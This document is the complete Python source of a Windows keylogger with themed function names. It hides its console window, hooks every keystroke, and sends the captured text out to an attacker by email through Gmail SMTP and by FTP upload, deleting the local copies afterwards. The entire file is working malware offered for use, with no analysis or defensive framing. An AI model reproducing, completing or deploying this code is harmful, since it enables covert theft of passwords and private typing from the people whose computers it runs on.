import pythoncom, pyHook
import os, sys, threading, smtplib, ftplib, datetime, time
import win32event, win32api, winerror, win32console, win32gui

mutex = win32event.CreateMutex(None, 1, 'shadow_knight')
if win32api.GetLastError() == winerror.ERROR_ALREADY_EXISTS:
    exit(0)

log_data = ''
file_counter = 0

# Disappear into the shadows
def vanish():
    win32gui.ShowWindow(win32console.GetConsoleWindow(), 0)

# Local Data Hoarder
def blackbox_storage():
    global log_data
    if len(log_data) > 100:
        with open("stealth_logs.txt", "a") as log_file:
            log_file.write(log_data)
        log_data = ''

# Phantom Messenger (Email Logs)
class PhantomMessenger(threading.Thread):
    def __init__(self):
        threading.Thread.__init__(self)
        self.event = threading.Event()
    
    def run(self):
        while not self.event.is_set():
            global log_data
            if len(log_data) > 100:
                ts = datetime.datetime.now()
                SERVER, PORT = "smtp.gmail.com", 587
                USER, PASS = "your_email@gmail.com", "password_here"
                TO = ["to_address@gmail.com"]
                SUBJECT = f"Shadow Logs - {ts}"
                MESSAGE = f"From: {USER}\nTo: {', '.join(TO)}\nSubject: {SUBJECT}\n\n{log_data}"
                try:
                    server = smtplib.SMTP(SERVER, PORT)
                    server.starttls()
                    server.login(USER, PASS)
                    server.sendmail(USER, TO, MESSAGE)
                    log_data = ''
                    server.quit()
                except Exception as e:
                    pass
            self.event.wait(120)

# Dark Web Courier (FTP Upload)
def dark_web_courier():
    global log_data, file_counter
    if len(log_data) > 100:
        file_counter += 1
        file_name = f"shadow_log_{file_counter}.txt"
        with open(file_name, "a") as log_file:
            log_file.write(log_data)
        log_data = ''
        try:
            SERVER, USERNAME, PASSWORD = "ftp.xxxxxx.com", "ftp_user", "ftp_pass"
            SSL, OUTPUT_DIR = 0, "/"
            ft = ftplib.FTP(SERVER, USERNAME, PASSWORD) if not SSL else ftplib.FTP_TLS(SERVER, USERNAME, PASSWORD)
            ft.cwd(OUTPUT_DIR)
            with open(file_name, 'rb') as fp:
                ft.storbinary(f'STOR {file_name}', fp)
            ft.quit()
            os.remove(file_name)
        except Exception as e:
            pass

# Master of Puppets (Key Capture)
def master_of_puppets(event):
    global log_data
    key = {13: '<ENTER>', 8: '<BACKSPACE>', 9: '<TAB>'}.get(event.Ascii, chr(event.Ascii))
    log_data += key
    blackbox_storage()
    dark_web_courier()

vanish()
if len(sys.argv) > 1 and sys.argv[1] == "email":
    messenger = PhantomMessenger()
    messenger.start()

obj = pyHook.HookManager()
obj.KeyDown = master_of_puppets
obj.HookKeyboard()
pythoncom.PumpMessages()
